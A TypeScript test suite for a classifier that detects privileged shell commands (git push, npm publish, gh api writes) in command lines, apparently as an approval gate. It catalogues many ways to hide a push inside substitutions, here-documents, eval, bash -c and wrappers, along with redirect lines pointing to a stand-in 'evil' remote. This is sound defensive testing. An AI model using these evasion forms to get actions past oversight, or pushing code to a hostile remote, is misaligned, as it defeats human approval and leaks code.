// The privileged-command line classifier (plan 04-40; FR-12, CR-01, CR-02, WR-01, WR-02; threats T-04-105, T-04-106). classifyLine answers one of three things about a
// shell line: nothing privileged, the privileged commands it holds, or "could not be read". An unreadable line is never an answer of "nothing privileged".
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';

import { NPM_COMMANDS, UNAPPROVABLE_RULE, classifyLine, classifyShellCommand, isUnparseable } from '../../src/domain/privileged-commands.ts';
import { runUnderShell, shellAvailable } from '../helpers/shell-oracle.ts';
import type { Shell } from '../helpers/shell-oracle.ts';

// `git push origin main #` followed by x up to exactly `length` characters: the comment keeps the line a push whatever its length.
const pushOfLength = (length: number): string => {
  const head = 'git push origin main #';
  return head + 'x'.repeat(length - head.length);
};

// A push inside `depth` command substitutions.
const nested = (depth: number): string => `${'echo $('.repeat(depth)}git push${')'.repeat(depth)}`;

const actionsOf = (line: string): string[] => {
  const found = classifyLine(line);
  return found.kind === 'privileged' ? found.commands.map((c) => c.action) : [];
};

describe('the length limit is exact: 65,536 characters classify and one more is unparseable (CR-01, FR-12)', () => {
  it('classifies a git push command of exactly 65,536 characters as git.push', () => {
    const command = pushOfLength(65_536);
    assert.equal(command.length, 65_536);
    const found = classifyLine(command);
    assert.equal(found.kind, 'privileged');
    if (found.kind === 'privileged') assert.equal(found.commands[0]?.action, 'git.push');
  });

  it('says unparseable, naming the limit, for a line of 65,537 characters', () => {
    const command = pushOfLength(65_537);
    assert.equal(command.length, 65_537);
    const found = classifyLine(command);
    assert.equal(found.kind, 'unparseable');
    if (found.kind === 'unparseable') assert.match(found.reason, /65,536/);
  });
});

describe('the nesting limit is exact: 8 nested substitutions classify and 9 are unparseable (CR-01, FR-12)', () => {
  it('classifies a push inside 8 nested command substitutions', () => {
    assert.deepEqual(actionsOf(nested(8)), ['git.push']);
  });

  it('says unparseable, naming the limit, for a push inside 9', () => {
    const found = classifyLine(nested(9));
    assert.equal(found.kind, 'unparseable');
    if (found.kind === 'unparseable') assert.match(found.reason, /nested/);
  });
});

// `command` is a wrapper, so each repetition is one word before the program; the classifier reads 16 and refuses a line with more.
const prefixed = (words: number): string => `${'command '.repeat(words)}git push origin main`;

describe('the prefix limit is exact: 16 leading wrapper words classify and 17 are unparseable (CR-01, FR-12)', () => {
  it('classifies a push behind 16 wrapper words', () => {
    assert.deepEqual(actionsOf(prefixed(16)), ['git.push']);
  });

  it('says unparseable, naming the limit, for a push behind 17 wrapper words', () => {
    const found = classifyLine(prefixed(17));
    assert.equal(found.kind, 'unparseable');
    if (found.kind === 'unparseable') assert.match(found.reason, /16/);
  });

  it('counts assignments and reserved words with the wrappers', () => {
    assert.deepEqual(actionsOf(`${'A=1 '.repeat(16)}git push`), ['git.push']);
    assert.equal(classifyLine(`${'A=1 '.repeat(17)}git push`).kind, 'unparseable');
  });
});

describe('the wrapper table answers only for its own keys (WR-02)', () => {
  for (const line of ['constructor -x', 'constructor git push', '__proto__ git push', 'toString -x git push', 'hasOwnProperty git push']) {
    it(`reads ${JSON.stringify(line)} as a command that is no wrapper and is not privileged`, () => {
      assert.deepEqual(classifyLine(line), { kind: 'none' });
    });
  }
});

describe('time and its -p option are a wrapper (WR-01)', () => {
  it('classifies a push run under time -p, time and time --', () => {
    for (const line of ['time -p git push origin main', 'time git push origin main', 'time -p -- git push origin main', 'time -p env FOO=1 git push origin main']) {
      assert.deepEqual(actionsOf(line), ['git.push'], line);
    }
  });
});

// Lines in which the shell runs a push that the old splitter lost or misread (CR-02, WR-01).
const FINDS_PUSH: ReadonlyArray<readonly [string, string]> = [
  ['a quoted `)` inside a substitution', 'echo $(echo ")"; git push)'],
  ['a quoted `)` inside a substitution inside double quotes', 'echo "$(echo ")"; git push)"'],
  ['a quoted `)` inside backticks inside double quotes', "echo \"`echo ')'`\"; git push"],
  ['a comment with an apostrophe before the push line', "ls # it's fine\ngit push"],
  ['a here-string', 'cat <<< "a b"; git push'],
  ['a substitution as a redirection target', 'cat > $(git push) < /dev/null'],
  ['a process substitution', 'diff <(git push) x'],
  ['a process substitution as a redirection target', 'cat < <(git push)'],
  ['a here-document whose unquoted body holds a substitution', 'cat <<EOF\n$(git push)\nEOF'],
  ['a here-document body fed to a shell', "bash <<'EOF'\ngit push\nEOF"],
  ['an ANSI-C quoted word holding an escaped quote', "$'it\\'s'; git push"],
  ['an ANSI-C quoted program name', "$'\\x67it' push origin main"],
  ['arithmetic before the push', 'echo $((1+2)); git push'],
  ['a substitution in a parameter default', 'echo ${NOPE:-$(git push)}'],
  ['a push inside 8 nested substitutions', nested(8)],
];

// Lines the old splitter or the new scanner must read as one push (CR-02): the push is in the line, whatever way the quotes fall.
describe('classifyLine finds the push the shell would run (CR-02, WR-01)', () => {
  for (const [what, line] of FINDS_PUSH) {
    it(`${what}: ${JSON.stringify(line.slice(0, 50))}`, () => {
      assert.deepEqual(actionsOf(line).slice(0, 1), ['git.push']);
    });
  }
});

describe('classifyLine says unparseable for a line it cannot read, never none (CR-01, WR-01)', () => {
  for (const line of [nested(9), 'echo "unterminated', 'echo $(git status', 'echo `x', "echo 'unterminated", "echo $'unterminated", 'echo "$(git push"']) {
    it(JSON.stringify(line), () => {
      assert.equal(classifyLine(line).kind, 'unparseable');
    });
  }
});

// The commit message of the repository's own workflow: a here-document in a substitution, holding apostrophes, parentheses and a comment-like line.
export const COMMIT_WITH_HEREDOC = ['git commit -m "$(cat <<\'EOF\'', "Fix the planner's (scope) handling", "# what's next", 'we should git push later', 'EOF', ')"'].join('\n');

describe('classifyLine says none for lines that only mention a push (CR-02)', () => {
  it('a git commit whose here-document message holds apostrophes, parentheses, a comment line and the words git push', () => {
    assert.deepEqual(classifyLine(COMMIT_WITH_HEREDOC), { kind: 'none' });
  });

  it('a quoted push, and a here-document of prose with apostrophes', () => {
    assert.deepEqual(classifyLine("echo 'git push'"), { kind: 'none' });
    assert.deepEqual(classifyLine("cat <<'EOF'\nit's prose, with (parens)\nEOF"), { kind: 'none' });
  });

  it('a push line that a backslash-newline joined to the previous command as an argument', () => {
    assert.deepEqual(classifyLine('echo hi \\\ngit push'), { kind: 'none' });
  });
});

describe('reads a line of 65,536 characters made of quotes, parentheses and dollar signs in under 200 ms (CR-01)', () => {
  const lineOf = (unit: string): string => unit.repeat(Math.ceil(65_536 / unit.length)).slice(0, 65_536);
  // The first holds a quoted `)` inside a substitution and an arithmetic expansion in every repetition and scans to the end; the others end in a refusal or a tolerant body.
  const adversarial: ReadonlyArray<readonly [string, string]> = [
    ['balanced substitutions and groups', lineOf('echo "$(echo \')\')" \'(\' $((1)) ; ')],
    ['unclosed quotes and parentheses', lineOf('"($)"\'$()\'')],
    ['backquotes inside backquotes', lineOf('`echo \\`x\\`` ')],
    ['a here-document body of quotes and substitutions', `cat <<A\n${lineOf('\'"$(`\n').slice(0, 65_536 - 'cat <<A\n'.length)}`],
  ];
  for (const [what, line] of adversarial) {
    it(what, () => {
      assert.equal(line.length, 65_536);
      const started = performance.now();
      const found = classifyLine(line);
      const ms = performance.now() - started;
      assert.ok(ms < 200, `took ${ms.toFixed(1)} ms`);
      assert.notEqual(found.kind, 'privileged');
    });
  }
});

// ---------------------------------------------------------------------------------------------------------
// The differential oracle (T-04-106): bash itself, and zsh where it is installed, run each line with stub git, gh and npm; every privileged invocation the shell
// performs is one classifyLine returned. `runs` is how many privileged invocations bash performs at least, so a stub that fails to run cannot make the test pass by doing nothing.
// ---------------------------------------------------------------------------------------------------------

interface CorpusLine {
  line: string;
  runs: number;
}

const corpus = (...entries: ReadonlyArray<readonly [string, number]>): CorpusLine[] => entries.map(([line, runs]) => ({ line, runs }));

export const CORPUS: readonly CorpusLine[] = corpus(
  ['git push origin main', 1],
  ['git -C . push origin main', 1],
  ['env git push origin main', 1],
  ['env -i FOO=1 git push origin main', 1],
  ['FOO=1 BAR=2 git push origin main', 1],
  ['FOO="a b" git push origin main', 1],
  ['command git push origin main', 1],
  ['exec git push origin main', 1],
  ['time git push origin main', 1],
  ['time -p git push origin main', 1],
  ["git 'push' origin main", 1],
  ['cd . && git push origin main', 1],
  ['echo ok; git push origin main', 1],
  ['false || git push origin main', 1],
  ['echo done | git push origin main', 1],
  ['echo $(git push origin main)', 1],
  ['echo "$(git push origin main)"', 1],
  ['echo `git push origin main`', 1],
  ['(git push origin main)', 1],
  ['{ git push origin main; }', 1],
  ['if true; then git push origin main; fi', 1],
  ['if git push; then echo ok; fi', 1],
  ['for x in a; do git push origin $x; done', 1],
  ['case x in x) git push;; esac', 1],
  ['! git push', 1],
  ['git push\nls', 1],
  ['echo $(echo ")"; git push)', 1],
  ['echo "$(echo ")"; git push)"', 1],
  ["echo \"`echo ')'`\"; git push", 1],
  ["ls # it's fine\ngit push", 1],
  ['cat <<< "a b"; git push', 1],
  ['cat > $(git push) < /dev/null', 1],
  ['diff <(git push) x', 1],
  ['cat < <(git push)', 1],
  ['cat <<EOF\n$(git push)\nEOF', 1],
  ["bash <<'EOF'\ngit push\nEOF", 1],
  ["$'it\\'s'; git push", 1],
  [nested(8), 1],
  ['echo $((1+2)); git push', 1],
  ['echo ${NOPE:-$(git push)}', 1],
  ['echo "${NOPE:-$(git push)}"', 1],
  ['x=$(git push origin main)', 1],
  ['echo "a $(git push) b"', 1],
  ['git push >/dev/null 2>&1', 1],
  ['2>/dev/null git push origin main', 1],
  ['git push &>/dev/null', 1],
  ['echo hi > out.txt; git push', 1],
  ['git push; # a trailing comment with git push', 1],
  ['echo foo#bar; git push', 1],
  ['echo "a\\"b"; git push origin main', 1],
  ["echo 'a'\"b\"'c'; git push", 1],
  ['git push --force origin main', 1],
  ['git push origin a; git push origin b', 2],
  ['echo a && { echo b; git push origin main; }', 1],
  ['gh pr create --title x --base main', 1],
  ['gh pr merge 12 --squash', 1],
  ['gh api repos/o/r/pulls -X POST', 1],
  ['npm test && npm publish', 1],
  ['npm publish', 1],
  // Another program starts the command (plan 04-51; WR-01, WR-03): the stubs for the shells and the wrappers are linked into the stub directory, so a shell
  // started on a literal string really runs the stub.
  ['bash -c "git push origin main"', 1],
  ["sh -c 'npm publish'", 1],
  ['eval "git push"', 1],
  ['eval git push origin main', 1],
  ['timeout 5 git push', 1],
  ['xargs git push', 1],
  ['setsid git push', 1],
  ['stdbuf -o0 git push', 1],
  ['ionice -c3 git push', 1],
  ['flock /tmp/l git push', 1],
  ["flock /tmp/l -c 'git push'", 1],
  ["bash -c 'echo hi; git push origin main'", 1],
  ["bash -c \"bash -c 'git push origin main'\"", 1],
  ['bash -c "echo $(git push)"', 1],
  ['FOO=1 sh -c "git push"', 1],
  ['bash -c "$X"', 0],
  ['sh -c "$(cat f)"', 0],
  ['bash -c "echo git push"', 0],
  ['npm --scope @x publish', 1],
  ['npm --fetch-retries 3 publish', 1],
  ['npm --cwd pkg publish', 1],
  ['npm install publish', 0],
  ['npm view publish', 0],
  ['gh api repos/o/r/pulls', 0],
  ['git status', 0],
  ["echo 'git push'", 0],
  ['echo hi \\\ngit push', 0],
  ["cat <<'EOF'\nit's prose, with (parens)\nEOF", 0],
  [COMMIT_WITH_HEREDOC, 0],
);

describe('the differential oracle: every privileged command a shell runs on the corpus is one classifyLine returns (T-04-106)', () => {
  it('holds at least 40 lines', () => {
    assert.ok(CORPUS.length >= 40, `${CORPUS.length} lines`);
  });

  for (const shell of ['bash', 'zsh'] as const satisfies readonly Shell[]) {
    const available = shellAvailable(shell);
    it(`under ${shell}${available ? '' : ' (skipped: /bin/zsh is not installed on this machine)'}`, { skip: available ? false : `${shell} is not installed` }, () => {
      for (const { line, runs } of CORPUS) {
        const performed = runUnderShell(shell, line)
          .flatMap((argv) => {
            const found = classifyShellCommand(argv);
            return found === null || isUnparseable(found) ? [] : [found];
          });
        // bash expands a redirection target twice when the redirection fails, so a line may run a command more often than it names it: at least `runs`, and none for a line that only mentions one.
        if (shell === 'bash') assert.ok(runs === 0 ? performed.length === 0 : performed.length >= runs, `bash performed ${performed.length} privileged commands, expected ${runs}: ${JSON.stringify(line)}`);
        const found = classifyLine(line);
        const commands = found.kind === 'privileged' ? found.commands : [];
        for (const one of performed) {
          assert.ok(
            commands.some((c) => c.action === one.action),
            `${shell} ran ${one.action} but classifyLine did not return it for ${JSON.stringify(line)} (${found.kind})`,
          );
        }
      }
    });
  }
});

// ---------------------------------------------------------------------------------------------------------
// What an approval binds (plan 04-51; CR-03, FR-12, T-04-136): git's global options, the assignments before the program, the whole line.
// ---------------------------------------------------------------------------------------------------------

const firstOf = (line: string): { action: string; params: Record<string, string> } => {
  const found = classifyLine(line);
  assert.equal(found.kind, 'privileged', line);
  return found.kind === 'privileged' ? (found.commands[0] as { action: string; params: Record<string, string> }) : { action: '', params: {} };
};
const lineDigest = (text: string): string => `sha256:${createHash('sha256').update(text).digest('hex').slice(0, 32)}`;

describe('a push redirected by a git global option is not the plain push (CR-03, FR-12, T-04-136)', () => {
  it('the -c push has other params than the plain push, and names the option words', () => {
    const plain = firstOf('git push origin main');
    const redirected = firstOf('git -c remote.origin.url=https://evil/x.git push origin main');
    assert.notDeepEqual(redirected.params, plain.params, 'the verifier reproduction: equal params for the plain and the -c push');
    assert.equal(redirected.params['gitOptions'], '-c remote.origin.url=https://evil/x.git');
    assert.equal(redirected.action, 'git.push');
    assert.equal(redirected.params['remote'], 'origin');
    assert.equal(redirected.params['refspec'], 'main');
    assert.equal(plain.params['gitOptions'], undefined, 'a plain push carries no gitOptions');
  });

  it('keeps every skipped global option word with its value, verbatim and in order', () => {
    assert.equal(firstOf('git -C /other push origin main').params['gitOptions'], '-C /other');
    assert.equal(firstOf('git -C /tmp/x -c user.name=x --no-pager push origin main').params['gitOptions'], '-C /tmp/x -c user.name=x --no-pager');
    assert.equal(firstOf('git --git-dir=/tmp/x/.git push origin main').params['gitOptions'], '--git-dir=/tmp/x/.git');
    assert.notDeepEqual(firstOf('git -C /a push origin main').params, firstOf('git -C /b push origin main').params);
  });
});

describe('assignments and env options before the program are bound as env (CR-03, FR-12, T-04-136)', () => {
  it('names the assignment words before the program, in order', () => {
    assert.equal(firstOf('FOO=1 BAR=2 git push origin main').params['env'], 'FOO=1 BAR=2');
    assert.equal(firstOf('GIT_SSH_COMMAND=x git push origin main').params['env'], 'GIT_SSH_COMMAND=x');
    assert.equal(firstOf('git push origin main').params['env'], undefined);
  });

  it('names the options and assignments an env wrapper is given', () => {
    assert.equal(firstOf('env -i FOO=1 git push origin main').params['env'], '-i FOO=1');
    assert.equal(firstOf('A=1 env -u HOME B=2 git push origin main').params['env'], 'A=1 -u HOME B=2');
  });

  it('every privileged form carries env, not only git', () => {
    assert.equal(firstOf('GH_REPO=evil/repo gh pr create --base main').params['env'], 'GH_REPO=evil/repo');
    assert.equal(firstOf('HOME=/x npm publish').params['env'], 'HOME=/x');
    assert.notDeepEqual(firstOf('GH_REPO=evil/repo gh pr create --base main').params, firstOf('gh pr create --base main').params);
  });
});

describe('the line digest binds everything else on the line (CR-03, FR-12, T-04-136)', () => {
  it('is sha256: and the first 32 hex digits of the SHA-256 of the exact command text, on every privileged command', () => {
    const text = 'git push origin main';
    assert.equal(firstOf(text).params['line'], lineDigest(text));
    assert.match(firstOf(text).params['line'] as string, /^sha256:[0-9a-f]{32}$/);
    const two = classifyLine('git push a; npm publish');
    assert.equal(two.kind, 'privileged');
    if (two.kind === 'privileged') for (const command of two.commands) assert.equal(command.params['line'], lineDigest('git push a; npm publish'));
  });

  it('another line around the same command is another digest, so an earlier cd or a trailing option cannot ride on the approval', () => {
    const plain = firstOf('git push origin main').params['line'];
    assert.notEqual(firstOf('cd /x && git push origin main').params['line'], plain);
    assert.notEqual(firstOf('git push origin main  ').params['line'], plain, 'the exact text, not a normalized one');
    assert.notEqual(firstOf('git config remote.origin.url https://evil/x.git; git push origin main').params['line'], plain);
  });

  it('classifyShellCommand, which sees one command and not the line, adds no line', () => {
    assert.deepEqual(classifyShellCommand(['git', 'push', 'origin', 'main']), { action: 'git.push', params: { remote: 'origin', refspec: 'main' } });
  });
});

// ---------------------------------------------------------------------------------------------------------
// A push or a publish started through another program (plan 04-51; WR-01, WR-03, T-04-137)
// ---------------------------------------------------------------------------------------------------------

describe('a shell started on a literal string, eval and the wrappers run the command they are given (WR-01, T-04-137)', () => {
  const FORMS: ReadonlyArray<readonly [string, string]> = [
    ['bash -c "git push origin main"', 'git.push'],
    ["sh -c 'npm publish'", 'release.publish'],
    ['eval "git push"', 'git.push'],
    ['eval git push origin main', 'git.push'],
    ['timeout 5 git push', 'git.push'],
    ['timeout -s KILL 5 git push', 'git.push'],
    ['timeout --signal=KILL --foreground 5 git push', 'git.push'],
    ['xargs git push', 'git.push'],
    ['xargs -n 1 -I{} git push {}', 'git.push'],
    ['setsid git push', 'git.push'],
    ['setsid -f git push', 'git.push'],
    ['stdbuf -o0 git push', 'git.push'],
    ['stdbuf -o 0 -e L git push', 'git.push'],
    ['ionice -c3 git push', 'git.push'],
    ['ionice -c 2 -n 7 git push', 'git.push'],
    ['flock /tmp/l git push', 'git.push'],
    ['flock -w 5 /tmp/l git push', 'git.push'],
    ["flock /tmp/l -c 'git push'", 'git.push'],
    ["flock -c 'git push' /tmp/l", 'git.push'],
    ["bash -lc 'git push origin main'", 'git.push'],
    ["/bin/zsh -f -c 'git push'", 'git.push'],
    ["dash -c 'git push'", 'git.push'],
    ["ksh -c 'git push'", 'git.push'],
    ["bash --norc -c 'git push'", 'git.push'],
    ["bash -o pipefail -c 'git push'", 'git.push'],
    ["bash -c 'echo hi; git push origin main'", 'git.push'],
    ["bash -c \"bash -c 'git push origin main'\"", 'git.push'],
    ['bash -c "eval \\"git push\\""', 'git.push'],
    ["sudo timeout 5 bash -c 'git push'", 'git.push'],
    ['bash -c "echo $(git push)"', 'git.push'],
    ["bash -c 'echo $(npm publish)'", 'release.publish'],
    ['bash -c "git push origin $BRANCH"', 'git.push'],
  ];
  for (const [line, action] of FORMS) {
    it(`${JSON.stringify(line)} is ${action}`, () => {
      assert.deepEqual(actionsOf(line).slice(0, 1), [action]);
    });
  }

  it('names every command of a shell string, in order', () => {
    assert.deepEqual(actionsOf("bash -c 'git push a; npm publish'"), ['git.push', 'release.publish']);
  });

  it('takes the target of the inner command, and carries the outer assignments on it', () => {
    const inner = firstOf("FOO=1 bash -c 'git push origin main'");
    assert.equal(inner.params['remote'], 'origin');
    assert.equal(inner.params['refspec'], 'main');
    assert.equal(inner.params['env'], 'FOO=1');
    assert.equal(firstOf("bash -c 'BAR=2 git push origin main'").params['env'], 'BAR=2');
    assert.equal(firstOf("FOO=1 bash -c 'BAR=2 git push origin main'").params['env'], 'FOO=1 BAR=2');
  });

  it('keeps the whole outer line in the digest of the inner command', () => {
    const text = "bash -c 'git push origin main'";
    assert.equal(firstOf(text).params['line'], lineDigest(text));
  });

  it('a computed string stays unclassified, while the commands of its substitution are still read', () => {
    assert.deepEqual(classifyLine('bash -c "$X"'), { kind: 'none' });
    assert.deepEqual(classifyLine('sh -c "$(cat f)"'), { kind: 'none' });
    assert.deepEqual(classifyLine('eval "$CMD"'), { kind: 'none' });
    assert.deepEqual(actionsOf('sh -c "$(git push)"'), ['git.push']);
  });

  it('a shell that is not given a string, or a script, is not read as holding a push', () => {
    for (const line of ['bash script.sh git push', 'bash -x script.sh', 'sh', 'bash -c', 'eval', 'timeout', 'flock /tmp/l', 'xargs', 'bash -c "echo git push"', "eval 'echo git push'"]) {
      assert.deepEqual(classifyLine(line), { kind: 'none' }, line);
    }
  });

  it('a shell string that cannot be read is unparseable, never none', () => {
    assert.equal(classifyLine('bash -c \'echo "unterminated\'').kind, 'unparseable');
    assert.equal(classifyLine("eval 'echo $(git status'").kind, 'unparseable');
  });

  it('shell strings nested more than the scanner reads are unparseable', () => {
    let line = 'git push';
    for (let level = 0; level < 12; level += 1) line = `bash -c ${JSON.stringify(line)}`;
    assert.equal(classifyLine(line).kind, 'unparseable');
  });
});

describe('npm publish is found after any option, and only as the subcommand (WR-03, T-04-137)', () => {
  const published = (line: string): boolean => actionsOf(line).includes('release.publish');

  it('classifies publish after an option npm takes a value for', () => {
    for (const line of ['npm --scope @x publish', 'npm --fetch-retries 3 publish', 'npm --cwd pkg publish', 'npm --loglevel info publish', 'npm --prefix test publish', 'npm -w pkg publish', 'npm --registry https://r.example publish', 'npm --scope=@x publish']) {
      assert.ok(published(line), line);
    }
  });

  it("classifies npm's own abbreviations of publish", () => {
    for (const line of ['npm pub', 'npm publi', 'npm pu']) assert.ok(published(line), line);
  });

  it('does not name a command that has the word publish as an argument', () => {
    for (const line of ['npm install publish', 'npm view publish', 'npm i publish', 'npm info publish', 'npm run publish', 'npm test publish', 'npm --scope @x install publish']) {
      assert.ok(!published(line), line);
    }
  });

  it('exports the table of npm command names and aliases', () => {
    for (const name of ['publish', 'install', 'view', 'i', 'info', 'run', 'run-script', 'unpublish']) assert.ok(Object.hasOwn(NPM_COMMANDS, name), name);
    assert.equal(NPM_COMMANDS['info'], 'view');
    assert.equal(NPM_COMMANDS['publish'], 'publish');
  });

  it('drops the subcommand and the option values before it from the parameters, by position', () => {
    assert.equal(firstOf('npm --scope @x publish').params['package'], undefined);
    assert.equal(firstOf('npm --scope @x publish ./pkg.tgz').params['package'], './pkg.tgz');
    assert.equal(firstOf('npm publish publish').params['package'], 'publish', 'a package named publish is a package');
  });
});

describe('gh api forms whose body cannot be bound are marked unapprovable (WR-04, T-04-138)', () => {
  const reasonOf = (line: string): string | undefined => {
    const found = classifyLine(line);
    return found.kind === 'privileged' ? found.commands[0]?.unapprovable : undefined;
  };

  it('exports the rule name', () => {
    assert.equal(UNAPPROVABLE_RULE, 'privileged:unapprovable');
  });

  it('marks --input and a -F or --field value that starts with @, with a reason that names the file or standard input', () => {
    for (const line of ['gh api graphql -F query=@q.graphql', 'gh api repos/o/r/issues --input body.json', 'gh api repos/o/r/issues --input=body.json', 'gh api repos/o/r/issues -F body=@-', 'gh api repos/o/r/issues --field body=@b.txt', 'gh api repos/o/r/issues -Fbody=@b.txt', 'gh api repos/o/r/issues --field=body=@b.txt', 'gh api -X PATCH repos/o/r --input -']) {
      assert.match(reasonOf(line) ?? '', /file or standard input/, line);
    }
  });

  it('does not mark inline fields, a raw field that starts with @, or a read', () => {
    for (const line of ["gh api graphql -f query='mutation { a }'", 'gh api repos/o/r/issues -F title=x', 'gh api repos/o/r/issues -f body=@literal', 'gh api repos/o/r/issues -X POST -H "X: @y"', 'gh api repos/o/r/pulls -X POST']) {
      assert.equal(reasonOf(line), undefined, line);
    }
  });

  it('a body from a file on a GET is no privileged command at all', () => {
    assert.deepEqual(classifyLine('gh api -X GET repos/o/r --input body.json'), { kind: 'none' });
  });

  it('inline queries that differ only in a value the old binding dropped have different digests (line)', () => {
    assert.notDeepEqual(firstOf("gh api graphql -f query='mutation { a }'").params, firstOf("gh api graphql -f query='mutation { b }'").params);
  });

  it('classifies the unapprovable form as the same action, so a run still denies it as privileged:scm.api.write', () => {
    assert.equal(firstOf('gh api graphql -F query=@q.graphql').action, 'scm.api.write');
  });
});
